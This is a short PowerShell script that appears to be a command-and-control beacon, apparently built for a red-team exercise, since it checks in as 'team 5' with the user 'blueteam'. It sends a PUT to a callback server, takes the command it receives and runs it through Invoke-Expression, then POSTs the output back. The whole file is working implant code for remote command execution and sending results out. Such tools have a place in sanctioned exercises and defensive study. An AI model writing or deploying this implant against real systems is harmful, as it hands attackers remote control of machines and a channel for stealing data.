<#
Executes a command and returns the output
#>
function execute ($cmd) {
  try {
    $output = Invoke-Expression $cmd -ErrorVariable e;
  }
  catch {
    Write-Output $e;
    Write-Output "\n";
  }
  # TODO Finalize the output - e and output
  $results = $output;
  return $results;
}


$data = @{
  "team" = "5";
  "ip" = "10.1.1.30";
  "user" = "blueteam";
}

$url = "http://localhost:5000/callback"

$checkin = Invoke-RestMethod -Uri $url -Method PUT -Body ($data | ConvertTo-Json) -ContentType "application/json";
$command = $checkin.command
Write-Host "[+] Got command: $command"

$com_results = execute $command

Write-Host "[+] Results: $com_results"

$data = @{
  "id" = $checkin.id;
  "results" = $com_results;
}


$checkin = Invoke-RestMethod -Uri $url -Method POST -Body ($data | ConvertTo-Json) -ContentType "application/json";
$checkin